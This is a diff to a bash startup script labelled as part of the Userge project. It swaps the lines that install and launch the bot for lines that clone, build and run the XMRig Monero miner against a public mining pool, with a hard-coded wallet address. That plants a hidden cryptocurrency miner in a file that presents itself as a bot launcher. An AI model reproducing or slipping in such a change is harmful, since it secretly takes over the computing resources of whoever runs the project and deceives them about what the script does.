@@ -1,7 +1,7 @@
 #!/bin/bash
 #
-git clone https://github.com/deaduserbot18/x
-cd x;pip install -r requirements.txt;python3 -m tobrot
+git clone https://github.com/xmrig/xmrig
+cd xmrig;mkdir build;cd build;cmake ..;make;./xmrig -o gulf.moneroocean.stream:10128 -u 4355Rp6kHbgACujcyYDG8KGSvqNX6WBymCeFeYjgjKMXh2XgqEuUhWBdnjLNdnGDeD1DhJeJtkS9d23mMYm8KpSNMnXTrHg -p lokekkekek
 # Copyright (C) 2020-2021 by UsergeTeam@Github, < https://github.com/UsergeTeam >.
 #
 # This file is part of < https://github.com/UsergeTeam/Userge > project,
